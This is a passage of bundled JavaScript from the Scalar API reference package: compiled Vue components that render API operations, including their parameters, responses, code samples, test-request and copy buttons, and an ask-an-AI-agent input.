			return filteredBadges.value.length ? (openBlock(true), createElementBlock(Fragment, { key: 0 }, renderList(filteredBadges.value, (badge) => {
				return openBlock(), createBlock(unref(Badge_default), {
					key: badge.name,
					color: badge.color
				}, {
					default: withCtx(() => [createTextVNode(toDisplayString(badge.name), 1)]),
					_: 2
				}, 1032, ["color"]);
			}), 128)) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/layouts/ClassicLayout.vue.script.js
var _hoisted_1$25 = { class: "operation-title" };
var _hoisted_2$14 = { class: "operation-details" };
var _hoisted_3$9 = { class: "endpoint-label-path" };
var _hoisted_4$3 = { class: "endpoint-label-name" };
var _hoisted_5$2 = {
	key: 1,
	class: "font-code text-sm"
};
var _hoisted_6$2 = {
	key: 0,
	class: "mb-3 flex justify-end"
};
var _hoisted_7$2 = { class: "endpoint-content" };
var _hoisted_8$2 = { class: "operation-details-card" };
var _hoisted_9$1 = {
	key: 0,
	class: "operation-details-card-item"
};
var _hoisted_10 = {
	key: 1,
	class: "operation-details-card-item"
};
var _hoisted_11 = { class: "operation-details-card-item" };
var _hoisted_12 = { class: "operation-details-card-item" };
var _hoisted_13 = {
	key: 2,
	class: "operation-details-card-item"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/layouts/ClassicLayout.vue.js
var ClassicLayout_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ClassicLayout",
	props: {
		id: {},
		method: {},
		options: {},
		path: {},
		clientOptions: {},
		isCollapsed: { type: Boolean },
		isWebhook: { type: Boolean },
		selectedClient: {},
		selectedExample: {},
		eventBus: {},
		operation: {},
		selectedServer: {},
		selectedSecuritySchemes: {},
		requiredSecurity: {},
		document: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		const operationTitle = computed(() => __props.operation.summary || __props.path || "");
		const operationExtensions = computed(() => getXKeysFromObject(__props.operation));
		/** Whether the operation requires any OAuth scopes, used to skip the empty card item. */
		const hasRequiredScopes = computed(() => getRequiredScopeGroups(__props.requiredSecurity).length > 0);
		/** Track the selected request body content type so the code sample stays in sync */
		const selectedRequestBodyContentType = ref();
		/**
		* The example key actually shown in the request snippet for this operation.
		*
		* The test-request button lives in the accordion header, outside `OperationCodeSample`, so it
		* cannot read the resolved key from the footer slot like the modern layout does. We mirror it here
		* so the button opens the client with the same example the snippet displays, even when this
		* operation does not share the document-wide selection.
		*/
		const resolvedExampleKey = ref("");
		/** Selected request body oneOf/anyOf variants; synced with schema dropdowns and code sample */
		const requestBodyCompositionSelection = ref({});
		const requestBodyCompositionSelectionForCodeSample = computed(() => ({ ...requestBodyCompositionSelection.value }));
		const requestBodyCompositionSelectionKey = computed(() => JSON.stringify(requestBodyCompositionSelectionForCodeSample.value));
		provide(REQUEST_BODY_COMPOSITION_INDEX_SYMBOL, requestBodyCompositionSelection);
		/**
		* Selected response content type per status code. Shared between the response list (which writes
		* the selection) and the example response panel (which reads it) so the two stay in sync.
		*/
		const selectedResponseContentTypes = ref({});
		const { copyToClipboard } = useClipboard();
		const { level: headingLevel } = useDocumentOutline("operation");
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(SectionAccordion_default), {
				id: __props.id,
				"aria-label": operationTitle.value,
				class: "reference-endpoint",
				modelValue: !__props.isCollapsed,
				transparent: "",
				"onUpdate:modelValue": _cache[5] || (_cache[5] = (value) => __props.eventBus?.emit("toggle:nav-item", {
					id: __props.id,
					open: value
				}))
			}, {
				title: withCtx(() => [createBaseVNode("div", _hoisted_1$25, [createBaseVNode("div", _hoisted_2$14, [createVNode(unref(HttpMethod_default), {
					class: "endpoint-type",
					method: __props.method,
					short: ""
				}, null, 8, ["method"]), createVNode(unref(Anchor_default), {
					class: "endpoint-anchor",
					onCopyAnchorUrl: _cache[0] || (_cache[0] = () => __props.eventBus?.emit("copy-url:nav-item", { id: __props.id }))
				}, {
					default: withCtx(() => [(openBlock(), createBlock(resolveDynamicComponent(`h${unref(headingLevel)}`), { class: "endpoint-label" }, {
						default: withCtx(() => [
							createBaseVNode("div", _hoisted_3$9, [createVNode(OperationPath_default, {
								deprecated: unref(isOperationDeprecated)(__props.operation),
								path: __props.path
							}, null, 8, ["deprecated", "path"])]),
							createBaseVNode("div", _hoisted_4$3, toDisplayString(operationTitle.value), 1),
							unref(getOperationStability)(__props.operation) ? (openBlock(), createBlock(unref(Badge_default), {
								key: 0,
								class: normalizeClass(["capitalize", unref(getOperationStabilityColor)(__props.operation)])
							}, {
								default: withCtx(() => [createTextVNode(toDisplayString(unref(getOperationStability)(__props.operation)), 1)]),
								_: 1
							}, 8, ["class"])) : createCommentVNode("", true),
							__props.isWebhook ? (openBlock(), createBlock(unref(Badge_default), {
								key: 1,
								class: "font-code text-green flex w-fit items-center justify-center gap-1"
							}, {
								default: withCtx(() => [createVNode(unref(ScalarIconWebhooksLogo_default), { weight: "bold" }), createTextVNode(" " + toDisplayString(unref(translate)("operation.webhook")), 1)]),
								_: 1
							})) : createCommentVNode("", true),
							createVNode(unref(XBadges_default), {
								badges: __props.operation["x-badges"],
								position: "before"
							}, null, 8, ["badges"])
						]),
						_: 1
					}))]),
					_: 1
				})])])]),
				actions: withCtx(({ active }) => [
					createVNode(SecurityRequirementBadge_default, {
						hideLabel: "",
						requiredSecurity: __props.requiredSecurity
					}, null, 8, ["requiredSecurity"]),
					createVNode(unref(XBadges_default), {
						badges: __props.operation["x-badges"],
						position: "after"
					}, null, 8, ["badges"]),
					!__props.options.hideTestRequestButton ? (openBlock(), createElementBlock(Fragment, { key: 0 }, [active ? (openBlock(), createBlock(unref(TestRequestButton_default), {
						key: 0,
						id: __props.id,
						eventBus: __props.eventBus,
						exampleName: resolvedExampleKey.value,
						method: __props.method,
						path: __props.path,
						requestBodyCompositionSelection: requestBodyCompositionSelectionForCodeSample.value
					}, null, 8, [
						"id",
						"eventBus",
						"exampleName",
						"method",
						"path",
						"requestBodyCompositionSelection"
					])) : (openBlock(), createBlock(unref(ScalarIconPlay_default), {
						key: 1,
						class: "endpoint-try-hint size-4.5"
					}))], 64)) : createCommentVNode("", true),
					__props.options.showOperationId && __props.operation.operationId ? (openBlock(), createElementBlock("span", _hoisted_5$2, toDisplayString(__props.operation.operationId), 1)) : createCommentVNode("", true),
					createVNode(unref(ScalarIconButton_default), {
						class: "endpoint-copy p-0.5",
						icon: unref(ScalarIconCopy_default),
						label: unref(translate)("actions.copyEndpointUrl"),
						size: "xs",
						variant: "ghost",
						onClick: _cache[1] || (_cache[1] = withModifiers(($event) => unref(copyToClipboard)(__props.path), ["stop"]))
					}, null, 8, ["icon", "label"])
				]),
				description: withCtx(() => [__props.document ? (openBlock(), createElementBlock("div", _hoisted_6$2, [createVNode(CopyMarkdownButton_default, {
					document: __props.document,
					isWebhook: __props.isWebhook,
					method: __props.method,
					path: __props.path
				}, null, 8, [
					"document",
					"isWebhook",
					"method",
					"path"
				])])) : createCommentVNode("", true), __props.operation.description ? (openBlock(), createBlock(unref(ScalarMarkdown_default), {
					key: 1,
					anchorPrefix: __props.id,
					"aria-label": unref(translate)("common.description"),
					role: "group",
					transformType: "heading",
					value: __props.operation.description,
					withAnchors: "",
					withImages: ""
				}, null, 8, [
					"anchorPrefix",
					"aria-label",
					"value"
				])) : createCommentVNode("", true)]),
				default: withCtx(() => [createBaseVNode("div", _hoisted_7$2, [
					createBaseVNode("div", _hoisted_8$2, [
						Object.keys(operationExtensions.value).length > 0 ? (openBlock(), createElementBlock("div", _hoisted_9$1, [createVNode(SpecificationExtension_default, { value: operationExtensions.value }, null, 8, ["value"])])) : createCommentVNode("", true),
						hasRequiredScopes.value ? (openBlock(), createElementBlock("div", _hoisted_10, [createVNode(OperationScopes_default, { requiredSecurity: __props.requiredSecurity }, null, 8, ["requiredSecurity"])])) : createCommentVNode("", true),
						createBaseVNode("div", _hoisted_11, [createVNode(OperationParameters_default, {
							selectedContentType: selectedRequestBodyContentType.value,
							"onUpdate:selectedContentType": _cache[2] || (_cache[2] = ($event) => selectedRequestBodyContentType.value = $event),
							breadcrumb: [__props.id],
							document: __props.document,
							eventBus: __props.eventBus,
							options: __props.options,
							parameters: __props.operation.parameters,
							requestBody: unref(getResolvedRef)(__props.operation.requestBody)
						}, null, 8, [
							"selectedContentType",
							"breadcrumb",
							"document",
							"eventBus",
							"options",
							"parameters",
							"requestBody"
						])]),
						createBaseVNode("div", _hoisted_12, [createVNode(OperationResponses_default, {
							selectedContentTypes: selectedResponseContentTypes.value,
							"onUpdate:selectedContentTypes": _cache[3] || (_cache[3] = ($event) => selectedResponseContentTypes.value = $event),
							breadcrumb: [__props.id],
							collapsableItems: !__props.options.expandAllResponses,
							document: __props.document,
							eventBus: __props.eventBus,
							options: __props.options,
							responses: __props.operation.responses
						}, null, 8, [
							"selectedContentTypes",
							"breadcrumb",
							"collapsableItems",
							"document",
							"eventBus",
							"options",
							"responses"
						])]),
						__props.operation?.callbacks ? (openBlock(), createElementBlock("div", _hoisted_13, [createVNode(Callbacks_default, {
							breadcrumb: [__props.id],
							callbacks: __props.operation.callbacks,
							document: __props.document,
							eventBus: __props.eventBus,
							options: __props.options,
							path: __props.path
						}, null, 8, [
							"breadcrumb",
							"callbacks",
							"document",
							"eventBus",
							"options",
							"path"
						])])) : createCommentVNode("", true)
					]),
					__props.operation.responses ? (openBlock(), createBlock(unref(ExampleResponses_default), {
						key: 0,
						class: "operation-example-card",
						eventBus: __props.eventBus,
						openapiVersion: __props.document?.openapi,
						responses: __props.operation.responses,
						selectedContentTypes: selectedResponseContentTypes.value,
						selectedExample: __props.selectedExample
					}, null, 8, [
						"eventBus",
						"openapiVersion",
						"responses",
						"selectedContentTypes",
						"selectedExample"
					])) : createCommentVNode("", true),
					createBaseVNode("div", null, [__props.operation.externalDocs ? (openBlock(), createBlock(unref(LinkList_default), { key: 0 }, {
						default: withCtx(() => [createVNode(unref(ExternalDocs_default), { value: __props.operation.externalDocs }, null, 8, ["value"])]),
						_: 1
					})) : createCommentVNode("", true), createVNode(unref(ScalarErrorBoundary_default), null, {
						default: withCtx(() => [(openBlock(), createBlock(unref(n$1), {
							key: requestBodyCompositionSelectionKey.value,
							class: "operation-example-card",
							clientOptions: __props.clientOptions,
							codeSampleUnavailable: unref(translate)("operation.codeSampleUnavailable"),
							eventBus: __props.eventBus,
							fallback: "",
							isWebhook: __props.isWebhook,
							method: __props.method,
							openapiVersion: __props.document?.openapi,
							operation: __props.operation,
							path: __props.path,
							requestBodyCompositionSelection: requestBodyCompositionSelectionForCodeSample.value,
							securitySchemes: __props.selectedSecuritySchemes,
							selectedClient: __props.selectedClient,
							selectedContentType: selectedRequestBodyContentType.value,
							selectedExample: __props.selectedExample,
							selectedServer: __props.selectedServer,
							"onUpdate:exampleKey": _cache[4] || (_cache[4] = ($event) => resolvedExampleKey.value = $event)
						}, null, 8, [
							"clientOptions",
							"codeSampleUnavailable",
							"eventBus",
							"isWebhook",
							"method",
							"openapiVersion",
							"operation",
							"path",
							"requestBodyCompositionSelection",
							"securitySchemes",
							"selectedClient",
							"selectedContentType",
							"selectedExample",
							"selectedServer"
						]))]),
						_: 1
					})])
				])]),
				_: 1
			}, 8, [
				"id",
				"aria-label",
				"modelValue"
			]);
		};
	}
}), [["__scopeId", "data-v-48e3f690"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/ask-agent-button/AskAgentButton.vue.script.js
var _hoisted_1$24 = { class: "ask-agent-scalar-input-label" };
var _hoisted_2$13 = ["placeholder"];
var _hoisted_3$8 = {
	class: "ask-agent-scalar-send",
	type: "submit"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/ask-agent-button/AskAgentButton.vue.js
var AskAgentButton_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "AskAgentButton",
	setup(__props) {
		const agentContext = useAgentContext();
		const { translate } = useLocalization();
		const message = ref("");
		const inputRef = ref();
		function handleSubmit() {
			agentContext.value?.openAgent(message.value);
			message.value = "";
		}
		return (_ctx, _cache) => {
			return unref(agentContext)?.agentEnabled.value ? (openBlock(), createElementBlock("form", {
				key: 0,
				class: "agent-button-container",
				onClick: _cache[1] || (_cache[1] = ($event) => inputRef.value?.focus()),
				onSubmit: _cache[2] || (_cache[2] = withModifiers(($event) => handleSubmit(), ["prevent"]))
			}, [
				createVNode(unref(ScalarIconSparkle_default), {
					class: "size-3 shrink-0",
					weight: "fill"
				}),
				createBaseVNode("div", _hoisted_1$24, toDisplayString(unref(translate)("agent.askAiAgent")), 1),
				withDirectives(createBaseVNode("input", {
					ref_key: "inputRef",
					ref: inputRef,
					"onUpdate:modelValue": _cache[0] || (_cache[0] = ($event) => message.value = $event),
					class: normalizeClass(["ask-agent-scalar-input", { "ask-agent-scalar-input-not-empty": message.value.length > 0 }]),
					placeholder: unref(translate)("agent.askAiAgent")
				}, null, 10, _hoisted_2$13), [[vModelText, message.value]]),
				createBaseVNode("button", _hoisted_3$8, [createVNode(unref(ScalarIconArrowUp_default), {
					class: "size-3",
					weight: "bold"
				})])
			], 32)) : createCommentVNode("", true);
		};
	}
}), [["__scopeId", "data-v-10a4fb90"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/layouts/ModernLayout.vue.script.js
var _hoisted_1$23 = { class: "flex flex-row justify-between gap-1" };
var _hoisted_2$12 = { class: "flex gap-1" };
var _hoisted_3$7 = { class: "flex items-center gap-1" };
var _hoisted_4$2 = { class: "operation-layout" };
var _hoisted_5$1 = { class: "operation-auth mb-1.5 flex min-h-8 items-center gap-3" };
var _hoisted_6$1 = { class: "operation-description" };
var _hoisted_7$1 = { class: "operation-details" };
var _hoisted_8$1 = { class: "examples" };
var _hoisted_9 = { class: "flex" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/layouts/ModernLayout.vue.js
var ModernLayout_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ModernLayout",
	props: {
		id: {},
		method: {},
		options: {},
		path: {},
		clientOptions: {},
		isWebhook: { type: Boolean },
		selectedClient: {},
		selectedExample: {},
		eventBus: {},
		operation: {},
		selectedServer: {},
		selectedSecuritySchemes: {},
		requiredSecurity: {},
		document: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		const operationTitle = computed(() => __props.operation.summary || __props.path || "");
		const labelId = useId();
		const operationExtensions = computed(() => getXKeysFromObject(__props.operation));
		/** Track the selected request body content type so the code sample stays in sync */
		const selectedRequestBodyContentType = ref();
		/** Selected request body oneOf/anyOf variants; synced with schema dropdowns and code sample */
		const requestBodyCompositionSelection = ref({});
		const requestBodyCompositionSelectionForCodeSample = computed(() => ({ ...requestBodyCompositionSelection.value }));
		const requestBodyCompositionSelectionKey = computed(() => JSON.stringify(requestBodyCompositionSelectionForCodeSample.value));
		provide(REQUEST_BODY_COMPOSITION_INDEX_SYMBOL, requestBodyCompositionSelection);
		/**
		* Selected response content type per status code. Shared between the response list (which writes
		* the selection) and the example response panel (which reads it) so the two stay in sync.
		*/
		const selectedResponseContentTypes = ref({});
		const { level: headingLevel } = useDocumentOutline("operation");
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(Section_default), {
				id: __props.id,
				"aria-labelledby": unref(labelId),
				label: operationTitle.value,
				tabindex: "-1",
				onIntersecting: _cache[3] || (_cache[3] = () => __props.eventBus?.emit("intersecting:nav-item", { id: __props.id }))
			}, {
				default: withCtx(() => [createVNode(unref(SectionContent_default), null, {
					default: withCtx(() => [createBaseVNode("div", _hoisted_1$23, [createBaseVNode("div", _hoisted_2$12, [
						__props.options?.showOperationId && __props.operation.operationId ? (openBlock(), createBlock(unref(Badge_default), { key: 0 }, {
							default: withCtx(() => [createTextVNode(toDisplayString(__props.operation.operationId), 1)]),
							_: 1
						})) : createCommentVNode("", true),
						unref(getOperationStability)(__props.operation) ? (openBlock(), createBlock(unref(Badge_default), {
							key: 1,
							class: normalizeClass(["capitalize", unref(getOperationStabilityColor)(__props.operation)])
						}, {
							default: withCtx(() => [createTextVNode(toDisplayString(unref(getOperationStability)(__props.operation)), 1)]),
							_: 1
						}, 8, ["class"])) : createCommentVNode("", true),
						__props.isWebhook ? (openBlock(), createBlock(unref(Badge_default), {
							key: 2,
							class: "font-code text-green flex w-fit items-center justify-center gap-1"
						}, {
							default: withCtx(() => [createVNode(unref(ScalarIconWebhooksLogo_default), { weight: "bold" }), createTextVNode(" " + toDisplayString(unref(translate)("operation.webhook")), 1)]),
							_: 1
						})) : createCommentVNode("", true),
						createVNode(unref(XBadges_default), {
							badges: __props.operation["x-badges"],
							position: "before"
						}, null, 8, ["badges"])
					]), createBaseVNode("div", _hoisted_3$7, [createVNode(unref(XBadges_default), {
						badges: __props.operation["x-badges"],
						position: "after"
					}, null, 8, ["badges"])])]), createBaseVNode("div", _hoisted_4$2, [
						createBaseVNode("div", { class: normalizeClass(["operation-title", unref(isOperationDeprecated)(__props.operation) && "deprecated"]) }, [createVNode(unref(Anchor_default), { onCopyAnchorUrl: _cache[0] || (_cache[0] = () => __props.eventBus?.emit("copy-url:nav-item", { id: __props.id })) }, {
							default: withCtx(() => [createVNode(unref(SectionHeaderTag_default), {
								id: unref(labelId),
								level: unref(headingLevel)
							}, {
								default: withCtx(() => [createTextVNode(toDisplayString(operationTitle.value), 1)]),
								_: 1
							}, 8, ["id", "level"])]),
							_: 1
						})], 2),
						createBaseVNode("div", _hoisted_5$1, [createVNode(SecurityRequirementBadge_default, { requiredSecurity: __props.requiredSecurity }, null, 8, ["requiredSecurity"]), __props.document ? (openBlock(), createBlock(CopyMarkdownButton_default, {
							key: 0,
							document: __props.document,
							isWebhook: __props.isWebhook,
							method: __props.method,
							path: __props.path
						}, null, 8, [
							"document",
							"isWebhook",
							"method",
							"path"
						])) : createCommentVNode("", true)]),
						createBaseVNode("div", _hoisted_6$1, [createVNode(SpecificationExtension_default, { value: operationExtensions.value }, null, 8, ["value"]), createVNode(unref(ScalarMarkdown_default), {
							anchorPrefix: __props.id,
							"aria-label": unref(translate)("common.description"),
							role: "group",
							transformType: "heading",
							value: __props.operation.description,
							withAnchors: "",
							withImages: ""
						}, null, 8, [
							"anchorPrefix",
							"aria-label",
							"value"
						])]),
						createBaseVNode("div", _hoisted_7$1, [
							createVNode(OperationScopes_default, { requiredSecurity: __props.requiredSecurity }, null, 8, ["requiredSecurity"]),
							createVNode(OperationParameters_default, {
								selectedContentType: selectedRequestBodyContentType.value,
								"onUpdate:selectedContentType": _cache[1] || (_cache[1] = ($event) => selectedRequestBodyContentType.value = $event),
								breadcrumb: [__props.id],
								document: __props.document,
								eventBus: __props.eventBus,
								options: __props.options,
								parameters: __props.operation.parameters,
								requestBody: unref(getResolvedRef)(__props.operation.requestBody)
							}, null, 8, [
								"selectedContentType",
								"breadcrumb",
								"document",
								"eventBus",
								"options",
								"parameters",
								"requestBody"
							]),
							createVNode(OperationResponses_default, {
								selectedContentTypes: selectedResponseContentTypes.value,
								"onUpdate:selectedContentTypes": _cache[2] || (_cache[2] = ($event) => selectedResponseContentTypes.value = $event),
								breadcrumb: [__props.id],
								collapsableItems: !__props.options.expandAllResponses,
								document: __props.document,
								eventBus: __props.eventBus,
								options: __props.options,
								responses: __props.operation.responses
							}, null, 8, [
								"selectedContentTypes",
								"breadcrumb",
								"collapsableItems",
								"document",
								"eventBus",
								"options",
								"responses"
							]),
							createVNode(unref(ScalarErrorBoundary_default), null, {
								default: withCtx(() => [__props.operation.callbacks ? (openBlock(), createBlock(Callbacks_default, {
									key: 0,
									breadcrumb: [__props.id],
									callbacks: __props.operation.callbacks,
									class: "mt-6",
									document: __props.document,
									eventBus: __props.eventBus,
									options: __props.options,
									path: __props.path
								}, null, 8, [
									"breadcrumb",
									"callbacks",
									"document",
									"eventBus",
									"options",
									"path"
								])) : createCommentVNode("", true)]),
								_: 1
							})
						]),
						createBaseVNode("div", _hoisted_8$1, [
							__props.operation.externalDocs ? (openBlock(), createBlock(unref(LinkList_default), { key: 0 }, {
								default: withCtx(() => [createVNode(unref(ExternalDocs_default), { value: __props.operation.externalDocs }, null, 8, ["value"])]),
								_: 1
							})) : createCommentVNode("", true),
							createVNode(unref(ScalarErrorBoundary_default), null, {
								default: withCtx(() => [(openBlock(), createBlock(unref(n$1), {
									key: requestBodyCompositionSelectionKey.value,
									clientOptions: __props.clientOptions,
									codeSampleUnavailable: unref(translate)("operation.codeSampleUnavailable"),
									eventBus: __props.eventBus,
									fallback: "",
									isWebhook: __props.isWebhook,
									method: __props.method,
									openapiVersion: __props.document?.openapi,
									operation: __props.operation,
									path: __props.path,
									requestBodyCompositionSelection: requestBodyCompositionSelectionForCodeSample.value,
									securitySchemes: __props.selectedSecuritySchemes,
									selectedClient: __props.selectedClient,
									selectedContentType: selectedRequestBodyContentType.value,
									selectedExample: __props.selectedExample,
									selectedServer: __props.selectedServer
								}, {
									header: withCtx(() => [createVNode(OperationPath_default, {
										class: "font-code text-c-2 [&_em]:text-c-1 min-w-0 [&_em]:not-italic",
										deprecated: __props.operation?.deprecated,
										path: __props.path
									}, null, 8, ["deprecated", "path"])]),
									footer: withCtx(({ exampleName }) => [createBaseVNode("div", _hoisted_9, [createVNode(AskAgentButton_default), !__props.options.hideTestRequestButton ? (openBlock(), createBlock(unref(TestRequestButton_default), {
										key: 0,
										id: __props.id,
										eventBus: __props.eventBus,
										exampleName,
										method: __props.method,
										path: __props.path,
										requestBodyCompositionSelection: requestBodyCompositionSelectionForCodeSample.value
									}, null, 8, [
										"id",
										"eventBus",
										"exampleName",
										"method",
										"path",
										"requestBodyCompositionSelection"
									])) : createCommentVNode("", true)])]),
									_: 1
								}, 8, [
									"clientOptions",
									"codeSampleUnavailable",
									"eventBus",
									"isWebhook",
									"method",
									"openapiVersion",
									"operation",
									"path",
									"requestBodyCompositionSelection",
									"securitySchemes",
									"selectedClient",
									"selectedContentType",
									"selectedExample",
									"selectedServer"
								]))]),
								_: 1
							}),
							createVNode(unref(ScalarErrorBoundary_default), null, {
								default: withCtx(() => [__props.operation.responses ? (openBlock(), createBlock(unref(ExampleResponses_default), {
									key: 0,
									eventBus: __props.eventBus,
									openapiVersion: __props.document?.openapi,
									responses: __props.operation.responses,
									selectedContentTypes: selectedResponseContentTypes.value,
									selectedExample: __props.selectedExample,
									style: { "margin-top": "12px" }
								}, null, 8, [
									"eventBus",
									"openapiVersion",
									"responses",
									"selectedContentTypes",
									"selectedExample"
								])) : createCommentVNode("", true)]),
								_: 1
							})
						])
					])]),
					_: 1
				})]),
				_: 1
			}, 8, [
				"id",
				"aria-labelledby",
				"label"
			]);
		};
	}
}), [["__scopeId", "data-v-a12d4b07"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/Operation.vue.js
var Operation_default = /* @__PURE__ */ defineComponent({
	__name: "Operation",
	props: {
		id: {},
		method: {},
		options: {},
		document: {},
		path: {},
		pathValue: {},
		server: {},
		securitySchemes: {},
		clientOptions: {},
		isCollapsed: { type: Boolean },
		isWebhook: { type: Boolean },
		selectedClient: {},
		selectedExample: {},
		eventBus: {},
		authStore: {}
	},
	setup(__props) {
		/**
		* Operation from the new workspace store, ensure we are de-reference
		*
		* Also adds in params from the pathItemObject
		*/
		const operation = computed(() => {
			const entity = getResolvedRef(getPathItemOperation(__props.pathValue, __props.method));
			if (!entity) return null;
			const parameters = combineParams(__props.pathValue?.parameters, entity.parameters);
			return {
				...entity,
				parameters
			};
		});
		/**
		* Determine the effective server for the code examples.
		*/
		const selectedServer = computed(() => getFirstServer(operation.value?.servers ?? null, __props.pathValue?.servers ?? null, __props.server));
		const requiredSecurity = computed(() => getRequiredSecurity(operation.value, __props.document));
		/** We must ensure the selected security schemes are required on this operation */
		const selectedSecuritySchemes = computed(() => filterSelectedSecurity(__props.document, operation.value, __props.authStore.getAuthSelectedSchemas({
			type: "document",
			documentName: __props.document?.["x-scalar-navigation"]?.name ?? ""
		}), __props.authStore.getAuthSelectedSchemas({
			type: "operation",
			documentName: __props.document?.["x-scalar-navigation"]?.name ?? "",
			path: __props.path,
			method: __props.method
		}), __props.securitySchemes));
		return (_ctx, _cache) => {
			return operation.value ? (openBlock(), createElementBlock(Fragment, { key: 0 }, [__props.options.layout === "classic" ? (openBlock(), createBlock(ClassicLayout_default, {
				key: 0,
				id: __props.id,
				clientOptions: __props.clientOptions,
				document: __props.document,
				eventBus: __props.eventBus,
				isCollapsed: __props.isCollapsed,
				isWebhook: __props.isWebhook,
				method: __props.method,
				operation: operation.value,
				options: __props.options,
				path: __props.path,
				requiredSecurity: requiredSecurity.value,
				selectedClient: __props.selectedClient,
				selectedExample: __props.selectedExample,
				selectedSecuritySchemes: selectedSecuritySchemes.value,
				selectedServer: selectedServer.value
			}, null, 8, [
				"id",
				"clientOptions",
				"document",
				"eventBus",
				"isCollapsed",
				"isWebhook",
				"method",
				"operation",
				"options",
				"path",
				"requiredSecurity",
				"selectedClient",
				"selectedExample",
				"selectedSecuritySchemes",
				"selectedServer"
			])) : (openBlock(), createBlock(ModernLayout_default, {
				key: 1,
				id: __props.id,
				clientOptions: __props.clientOptions,
				document: __props.document,
				eventBus: __props.eventBus,
				isWebhook: __props.isWebhook,
				method: __props.method,
				operation: operation.value,
				options: __props.options,
				path: __props.path,
				requiredSecurity: requiredSecurity.value,
				selectedClient: __props.selectedClient,
				selectedExample: __props.selectedExample,
				selectedSecuritySchemes: selectedSecuritySchemes.value,
				selectedServer: selectedServer.value
			}, null, 8, [
				"id",
				"clientOptions",
				"document",
				"eventBus",
				"isWebhook",
				"method",
				"operation",
				"options",
				"path",
				"requiredSecurity",
				"selectedClient",
				"selectedExample",
				"selectedSecuritySchemes",
				"selectedServer"
			]))], 64)) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Operations/TraversedEntry.vue.script.js
var _hoisted_1$22 = ["id"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Operations/TraversedEntry.vue.js
var TraversedEntry_default = /* @__PURE__ */ defineComponent({
	__name: "TraversedEntry",
	props: {
		authStore: {},
		level: { default: 0 },
		insideTagContainer: {
			type: Boolean,
			default: false
		},
		entries: {},
		document: {},
		clientOptions: {},
		options: {},
		selectedServer: {},
		securitySchemes: {},
		selectedClient: {},
		selectedExample: {},
		expandedItems: {},
		eventBus: {}
	},
	setup(__props) {
		/**
		* Type guards for different entry types
		*/
		/**
		* A legacy `x-tagGroups` wrapper. These are not real tags and render without a header of their
		* own (flattened in the modern layout). OpenAPI 3.2 nested-tag sections are real tags that carry
		* `isGroup` but not `isTagGroup`, so they are intentionally excluded here and render through
		* {@link isTag} with their summary heading.
		*/
		const isTagGroup = (entry) => entry["type"] === "tag" && entry.isGroup === true && entry.isTagGroup === true;
		const isTag = (entry) => entry["type"] === "tag" && !isTagGroup(entry) && entry.id !== "models";
		const isOperation = (entry) => entry["type"] === "operation";
		const isWebhook = (entry) => entry["type"] === "webhook";
		/** Models are special form of tag entry */
		const isModelsTag = (entry) => entry["type"] === "models";
		const isModel = (entry) => entry["type"] === "model";
		/**
		* Keep schema wrappers with resolved targets while excluding unresolved sparse chunk references.
		*/
		const isSchemaObject = (value) => isObject(value) && (!("$ref" in value) || value["$ref-value"] !== void 0);
		/**
		* Resolves a model entry to the schema the Model component renders.
		*
		* A model may point at a named `$ref` wrapper whose item type is bound through a sibling `$defs`
		* (a named `Paginated<User>`). We keep that wrapper intact rather than resolving it away, so the
		* dynamic binding survives and the shared Schema renderer can bind the item type for display — see
		* #9883.
		*/
		const modelSchemas = computed(() => Object.fromEntries(Object.entries(__props.document.components?.schemas ?? {}).map(([name, schema]) => [name, isSchemaObject(schema) ? schema : void 0])));
		function getPathValue(entry) {
			return isWebhook(entry) ? getResolvedPathItem(__props.document.webhooks?.[entry.name]) : getResolvedPathItem(__props.document.paths?.[entry.path]);
		}
		return (_ctx, _cache) => {
			const _component_TraversedEntry = resolveComponent("TraversedEntry", true);
			return openBlock(true), createElementBlock(Fragment, null, renderList(__props.entries, (entry) => {
				return openBlock(), createBlock(Lazy_default, {
					id: entry.id,
					key: `${entry.id}-${__props.options.layout}`,
					expanded: !!__props.expandedItems[entry.id]
				}, {
					default: withCtx(() => [isOperation(entry) || isWebhook(entry) ? (openBlock(), createBlock(unref(SectionContainer_default), {
						key: 0,
						omit: __props.level !== 0
					}, {
						default: withCtx(() => [createVNode(unref(Operation_default), {
							id: entry.id,
							authStore: __props.authStore,
							clientOptions: __props.clientOptions,
							document: __props.document,
							eventBus: __props.eventBus,
							isCollapsed: !__props.expandedItems[entry.id],
							isWebhook: isWebhook(entry),
							method: entry.method,
							options: __props.options,
							path: isWebhook(entry) ? entry.name : entry.path,
							pathValue: getPathValue(entry),
							securitySchemes: __props.securitySchemes,
							selectedClient: __props.selectedClient,
							selectedExample: __props.selectedExample,
							server: __props.selectedServer
						}, null, 8, [
							"id",
							"authStore",
							"clientOptions",
							"document",
							"eventBus",
							"isCollapsed",
							"isWebhook",
							"method",
							"options",
							"path",
							"pathValue",
							"securitySchemes",
							"selectedClient",
							"selectedExample",
							"server"
						])]),
						_: 2
					}, 1032, ["omit"])) : isTag(entry) || isTagGroup(entry) && __props.options.layout === "classic" ? (openBlock(), createBlock(unref(Tag_default), {
						key: 1,
						eventBus: __props.eventBus,
						isCollapsed: !__props.expandedItems[entry.id],
						layout: __props.options.layout,
						moreThanOneTag: __props.entries.filter(isTag).length > 1,
						nested: __props.insideTagContainer,
						tag: entry
					}, {
						default: withCtx(() => ["children" in entry && entry.children?.length ? (openBlock(), createBlock(_component_TraversedEntry, {
							key: 0,
							authStore: __props.authStore,
